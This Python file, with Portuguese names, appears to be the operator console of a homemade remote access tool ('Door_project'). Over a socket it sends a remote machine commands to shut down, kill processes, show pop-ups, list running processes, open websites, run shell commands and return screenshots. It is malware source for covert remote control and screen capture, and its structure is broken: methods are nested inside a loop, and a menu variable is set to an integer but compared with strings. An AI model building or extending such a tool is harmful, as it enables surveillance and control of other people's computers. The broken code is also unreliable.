from threading import Thread
from time import sleep
escolher = 0

def pato(self):
    while True:
        # Selecionando processo escolhido
        if escolher == "1":
            print("iniciando desligar")
            self.pode = False
            Thread(target=self.desligar).start()


        elif escolher == "2":
            print("iniciando kill")
            self.pode = False
            Thread(target=self.kill).start()


        elif escolher == "3":
            print("iniciando PopUp")
            self.pode = False
            Thread(target=self.popup).start()


        elif escolher == "4":
            print("iniciando Eye_Process")
            self.pode = False
            Thread(target=self.process).start()


        elif escolher == "5":
            print("iniciando printScreen")
            self.pode = False
            Thread(target=self.printt).start()

        elif escolher == "7":
            self.point.close()
            exit()

        elif escolher == "9":
            print("Iniciando site")
            self.pode = False
            Thread(target=self.sit).start()

        else:
            continue


    def desligar(self):
        try:
            print("Enviando comando!")
            print("-=" * 30)
            self.objj.send(bytes("desligar", "utf8"))
            while True:
                dab = self.objj.recv(1024)
                if dab:
                    print(dab.decode("utf-8"))
                    self.pode = True
                    break
        except:
            sleep(1.5)
            self.pode = True


    def sit(self):
        abc = (input("Nome do site ---> "))
        try:
            print("Enviando...")
            self.objj.send(bytes(f"site\n{abc}", "utf8"))
            while True:
                dab = self.objj.recv(1024)
                if dab:
                    print(dab.decode("utf-8"))
                    self.pode = True
                    break

        except Exception:
            sleep(1.5)
            self.pode = True

    def kill(self):
        processo = (input("Coloque o nome do processo ---> ") + ".exe")
        try:
            print("Enviando comando!")
            self.objj.send(bytes(f"kill\n{processo}", "utf8"))
            while True:
                dab = self.objj.recv(1024)
                if dab:
                    print(dab.decode("utf-8"))
                    self.pode = True
                    break
        except:
            sleep(1.5)
            self.pode = True


    def popup(self):
        pop = (input("Coloque a menssagem ---> "))
        try:
            print("Enviando comando!")
            self.objj.send(bytes(f"popup\n{pop}", "utf8"))
            self.pode = True
        except:
            sleep(1.5)
            self.pode = True


    def process(self):
        try:
            print("Enviando comando!")
            self.objj.send(bytes(f"RP", "utf8"))
            while True:
                dab = self.objj.recv(1024)
                if dab:
                    proc = dab.decode("utf-8").split(",")
                    for a in proc:
                        print(a)
                    self.pode = True
                    break
        except:
            sleep(1.5)
            self.pode = True

    def printt(self):
        print("Enviando comando!")
        self.objj.send(bytes(f"PrintS", "utf8"))
        nome = input('nome do print ---> ')
        try:
            with open('C:\\Users\\drrod\\Desktop\\all\\Creative in Python\\PyPy\\apps py\\Door_project\\Pictures\\' + nome + '.png', 'wb') as foto:
                while True:
                    dab = self.objj.recv(1000000)
                    if not dab:
                        self.pode = True
                        break
                    foto.write(dab)
        except Exception:
            sleep(1.5)
            self.pode = True



    def expecifico(self):
        processo = (input("Comando do Cmd ---> ") + ".exe")
        try:
            print("Enviando comando!")
            self.objj.send(bytes(f"expecifico\n{processo}", "utf8"))
            while True:
                dab = self.objj.recv(1024)
                if dab:
                    print(dab.decode("utf-8"))
                    self.pode = True
                    break
        except:
            sleep(1.5)
            self.pode = True



